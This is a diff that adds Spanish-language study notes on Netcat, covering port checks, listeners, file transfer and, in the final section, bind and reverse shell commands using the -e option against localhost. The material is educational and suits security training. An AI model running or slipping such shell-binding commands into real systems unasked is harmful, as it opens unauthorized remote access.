@@ -1,0 +1,57 @@
+### Netcat
+Netcat 
+
+Lee y escribe datos a lo largo de conexiones de red, utilizando los protocolos TCP y UDP.
+
+1. Conexión con puerto TCP/UDP
+
+Puede ejecutarse tanto en modo cliente como en modo servidor:
+
+• Cliente: Nos permite conocer si un puerto esta abierto o cerrado, conectar con una red de servicio manualmente o leer un banner del servicio escuchando en un puerto.
+   ◇ nc <ip> <port>
+      ▪ -n → Salta la resolución DNS
+      ▪ -v → verbose
+
+2. Escuchando en puerto TCP/UDP
+
+•  nc → Escuchando en el puerto designado
+  ◇ -l → Crea un listener
+   ◇ -p <port>  → Especifica el puerto en el que escuchar
+
+3. Transferencia de ficheros con Netcat
+
+Similar al caso anterior, pero en en el caso del que escucha, se redirige la salida a un fichero, y del que manda información se redirige la ruta del fichero que se quiere enviar al comando de comunicación por el puerto concreto.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+nc -nlvp 4444 > incoming.exe		# Máquina escucha
+nc -nv 127.0.0.1 4444 < /usr/share/windows-resources/binaries/wget.exe  	# Máquina que envía
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
+4. Administración remota con Netcat
+
+Netcat se puede utilizar para obtener acceso remoto a los equipos, esto se puede hacer mediante la opción -e de netcat, sin embargo, aunque en kali si está disponible, en otros sistemas está deshabilitada por motivos de seguridad.
+
+   1) Bind shell
+   
+   Para  crear un bind shell basta con añadir la opción -e <shell> en el equipo en el que se vaya a escuchar la conexión, siendo <shell> el terminal que se vaya a utiliazar: cmd.exe en windows o /usr/bin/bash en linux por ejemplo. Esto enlaza la terminal con el puerto en el que escucha.
+    
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+nc -nlvp 4444 -e /usr/bin/bash        # Enlaza netcat con el bash del sistema
+
+nc -nv 127.0.0.1 4444 				# Se conecta consiguiendo acceso bash
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+   2) Reverse shell 
+   
+   En el caso de un reverse shell, no se puede enlazar un puerto localmente con una terminal, sino que se envía el control de la salida de sus comandos.
+   
+   
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+nc -nlvp 4444			# Se queda escuchando en el puerto 4444
+
+nc -nv 127.0.0.1 4444 -e /bin/bash		# Envía el reverse shell
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+
